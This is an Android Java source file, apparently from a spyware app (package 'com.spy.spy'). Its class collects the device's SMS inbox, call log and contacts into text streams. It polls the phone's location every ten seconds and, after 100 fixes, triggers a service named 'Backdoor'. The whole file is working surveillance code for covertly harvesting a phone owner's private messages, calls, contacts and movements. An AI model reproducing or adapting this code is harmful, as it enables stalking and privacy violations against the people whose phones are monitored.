package com.spy.spy;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Contacts;
import android.provider.ContactsContract;
import android.provider.Telephony;

import com.google.gson.*;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringBufferInputStream;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.reflect.Type;
import java.sql.Time;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import javax.xml.datatype.Duration;

/**
 * Created by lncosie on 2015/10/28.
 */
public class InfoZipper {
    Context context;
    enum    CursorType{
        CallLog,SMS,Contacts;
    }
    GpsRecorder gpsRecorder=new GpsRecorder();
    public void setContext(Context context){
        this.context=context;
    }
    void readSMS(Writer writer) throws IOException {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        readCursor(cursor,writer,CursorType.SMS);
    }
    void readCalls(Writer writer) throws IOException {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"),null, null, null, CallLog.Calls.DATE + " DESC");
        readCursor(cursor,writer,CursorType.CallLog);
    }
    void readContacts(Writer writer) throws IOException {
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        readCursor(cursor,writer, CursorType.Contacts);
    }
    void startGpsRecord(){
        gpsRecorder.start();
    }
    public String gpsStream(){
        return gpsRecorder.toStream();
    }

    public String toStream(){
        StringWriter writer=new StringWriter(512);
        try {
            readContacts(writer);
            readCalls(writer);
            readSMS(writer);
        } catch (IOException e) {
            return writer.toString();
        }
        return writer.toString();
    }
    class GpsRecorder {

        LocationManager locationManager = null;
        Timer timer=null;
        long  durtion=10000;
        long  gps_counter=0;
        Writer gps=null;
        GpsRecorder(){

        }
        public void start(){
            if(timer!=null)
                timer.cancel();
            gps_counter=0;
            gps=new StringWriter(512);
            timer=new Timer();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
            try {
                gps.write(sdf.format(new Date()));
            } catch (IOException e) {
                e.printStackTrace();
            }
            timer.schedule(record5min,0,durtion);
        }

        TimerTask   record5min=new TimerTask(){
            @Override
            public void run() {

                try{
                    GpsRecorder.this.locationManager=(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                    Location location=locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    gps.append('\n');
                    gps.append(location.toString());
                    gps_counter=gps_counter+1;
                    if(gps_counter>=100) {
                        Intent sc = new Intent(context, Backdoor.class);
                        sc.putExtra("action", Backdoor.GPS_FULL);
                        context.startService(sc);
                    }
                    //locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, listener);
                }catch (Exception e){

                }
            }
        };
        LocationListener listener=new LocationListener(){
            @Override
            public void onLocationChanged(Location loc) {
                try {
                    gps.append('\n');
                    gps.append(loc.toString());
                    gps_counter=gps_counter+1;
                    if(gps_counter>=100) {
                        Intent sc = new Intent(context, Backdoor.class);
                        sc.putExtra("action", Backdoor.GPS_FULL);
                        context.startService(sc);
                    }
                } catch (IOException e) {

                }finally {
                    GpsRecorder.this.locationManager.removeUpdates(listener);
                }
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };

        public String toStream(){
            String to=gps.toString();
            gps_counter=0;
            gps=new StringWriter(512);
            return to;
        }
    }


    private void decodeLocation(Location loc) {
        Geocoder gcd = new Geocoder(context, Locale.getDefault());
        List<Address> addresses;
        try {
            addresses = gcd.getFromLocation(loc.getLatitude(),
                    loc.getLongitude(), 1);
            if (addresses.size() > 0)
                System.out.println(addresses.get(0).getLocality());
            String cityName = addresses.get(0).getLocality();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void readCursor(Cursor cursor,Writer writer,CursorType cursorType) throws IOException {
        if (!cursor.moveToFirst())
            return;

        class Pair{
            Pair(int idx,Class<?> cs){
                this.idx=idx;
                this.cs=cs;
            }
            Integer idx;
            Class<?> cs;
        }
        ArrayList<Pair> ids=new ArrayList<Pair>();
        switch (cursorType){
            case CallLog:
                ids.add(new Pair(cursor.getColumnIndex(CallLog.Calls.NUMBER),String.class));
                ids.add(new Pair(cursor.getColumnIndex(CallLog.Calls.TYPE),String.class));
                ids.add(new Pair(cursor.getColumnIndex(CallLog.Calls.DATE),Date.class));
                ids.add(new Pair(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME),String.class));
                ids.add(new Pair(cursor.getColumnIndex(CallLog.Calls.DURATION),Duration.class));
                break;
            case SMS:
                ids.add(new Pair(cursor.getColumnIndex(Telephony.Sms.ADDRESS),Duration.class));
                //ids.add(new Pair(cursor.getColumnIndex(Telephony.Sms.DATE_SENT),Date.class));
                ids.add(new Pair(cursor.getColumnIndex(Telephony.Sms.DATE),Date.class));
                ids.add(new Pair(cursor.getColumnIndex(Telephony.Sms.BODY),String.class));
                break;
            case Contacts:
                ids.add(new Pair(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME),String.class));
                ids.add(new Pair(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER),String.class));
                break;
        }
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd_HH:mm:ss");
        do {
            writer.append('\n');
            for (int idx = 0; idx < ids.size(); idx++) {
                Pair pair=ids.get(idx);
                String cvt=cursor.getString(pair.idx);
                if(pair.cs.equals(Date.class)){
                    cvt=sdf.format(new Date(Long.valueOf(cvt)));
                }
                writer.append(cvt);
                writer.append('\t');
            }
            writer.append('\n');
        } while (cursor.moveToNext());
    }
}
